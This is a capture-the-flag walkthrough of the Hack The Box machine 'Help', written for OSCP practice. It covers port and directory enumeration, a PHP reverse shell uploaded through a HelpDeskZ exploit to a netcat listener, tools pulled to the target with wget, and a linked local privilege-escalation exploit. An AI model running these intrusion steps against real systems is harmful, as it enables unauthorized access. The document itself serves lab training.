---
Category: OSCP - TjNull
LAB:
Difficulty: Easy
Featured:
aliases:
  - Linux
---

---
# Information / Description

![](../../0.%20Assets/Help-1789812382733.webp)

---

# Walkthrough


Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

![](../../0.%20Assets/Help-1789812474848.webp)

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```
nmap -sS -p 22,80,3000  $T -sVC -oN results.txt --min-rate 5000 -vvv -Pn -n
```

These are the scan results.

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://help.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have SSH, an HTTP server, and what looks like an API.
The scan also leaks the machine name, `help.htb`, so let's add that to `/etc/hosts`.

I checked the API, and look at that.

![](../../0.%20Assets/Help-1789814111124.webp)

That looks like an invitation, and it gives us a possible username: `Shiv`.

I tried fuzzing and guessing a few endpoints like `/credentials`, but nothing came of it.

So let's go back to the HTTP server.


![](../../0.%20Assets/Help-1789812683038.webp)

Now it resolves properly, so let's fuzz it and see what turns up.

```
gobuster dir -u http://help.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 50
```

```
support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
server-status        (Status: 403) [Size: 296]
```

That's what it found, and the site now resolves.

![](../../0.%20Assets/Help-1789812800453.webp)

We see `helpdeskZ`, so let's look for exploits for it.

I went through a lot of different exploits before finding one that actually explained how to exploit the service properly:

![](../../0.%20Assets/Help-1789815988083.webp)

That's what I did. First I uploaded the [file](https://github.com/pentestmonkey/php-reverse-shell), a PHP reverse shell that you need to edit with your IP and netcat port.

![](../../0.%20Assets/Help-1789816501028.webp)

I started the listener with:

```
nc -nlvp 1234
```

And ran the [exploit](https://github.com/trevlee/helpdeskz_exploit/tree/master), a Python3 port of the original.

```
python3 exploit.py http://help.htb/ filename.php
```

![](../../0.%20Assets/Help-1789816668675.webp)

It took a couple of tries to get it working.

And in the home directory, we find the flag.

![](../../0.%20Assets/Help-1789816968588.webp)

For `privesc`, I like to `cd` into `/tmp`. We know we have write permissions there, and everything we drop in gets wiped on restart, so it cleans up after itself.

Using the Python server, I pulled over `linpeas.sh` and `lse.sh` to start the enumeration.

```
# HTTP server
python3 -m http.server 80 # I have a zsh alias to `serve`

# Downloading files from terminal
wget http://<yourIP>/<file-to-download>
```


![](../../0.%20Assets/Help-1789817997260.webp)

Then we just give them execute permissions with `chmod +x <filename>` and run them.

After running `lse.sh`, I found a couple of interesting things. Let's go through them one by one.

![](../../0.%20Assets/Help-1789818533430.webp)

This one isn't much use, or at least I haven't found a way to exploit it yet.

![](../../0.%20Assets/Help-1789818708261.webp)

Here, for example, we see a user crontab.

![](../../0.%20Assets/Help-1789818762603.webp)

I doubt this is exploitable, since it uses an absolute path.

I still looked at the file it was launching, and it was just some JavaScript. I thought I'd spotted the API endpoints, but not really.

![](../../0.%20Assets/Help-1789819154848.webp)

This looks interesting, so let's do a quick search.

![](../../0.%20Assets/Help-1789819177908.webp)

This looks promising, so let's try it.

I downloaded the exploit from here: [github](https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh)

I transferred it to the target with the `python http server` and ran it:

![](../../0.%20Assets/Help-1789819352916.webp)

And that's the machine done.

![](../../0.%20Assets/Help-1789819381268.webp)